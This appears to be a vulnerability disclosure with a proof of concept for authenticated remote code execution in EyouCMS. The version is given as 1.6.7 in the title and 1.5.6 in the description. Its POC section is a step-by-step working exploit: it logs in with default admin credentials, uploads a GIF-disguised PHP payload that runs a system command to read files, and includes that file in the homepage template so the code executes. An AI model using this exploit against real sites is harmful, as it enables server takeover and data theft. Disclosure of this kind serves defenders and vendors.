# EyouCMSv1.6.7 has Remote Code Excute vulnerability

## vendors

https://www.eyoucms.com/rizhi/

## Vulnerability function

Avatar upload And template include.

## Description

EyouCMSv1.5.6 has a remote code execution vulnerability in a system, which needs to be authenticated.

## POC

1.  login in the System.

username: admin

password: admin

2. Upload your website's logo

   logo's content:  

   ```
   GIF89a
   <?php system(‘cat /f*’);?>
   ```

![image-20241105221951608](https://github.com/user-attachments/assets/ae78a3c7-db74-46a6-9007-6b2beecacf37)

Upload the GIF and get the path

```
{"url":"\/uploads\/allimg\/20241104\/*.gif","time":1730707775,"width":2573,"height":16188,"title":"banner","original":"750.gif","state":"SUCCESS","path":"images","img_id":"3"}
```

3. Get the path uploads/allimg/20241104/*.gif



4.Go to Map Navigation to add a template to manage

![image-20241105222201758](https://github.com/user-attachments/assets/9f5fe3af-1a6e-4755-bbda-e5f4ee4fa591)

Then click on Template Management to add a file in the file of /pc/index.htm (here is the homepage template of the website).

{eyou:include file=”uploads/allimg/*.gif” /}

5.Then submit, go back to the homepage and get the flag at the bottom

![image-20241105222332182](https://github.com/user-attachments/assets/f5300907-db97-412a-a313-e6c01b51a199)
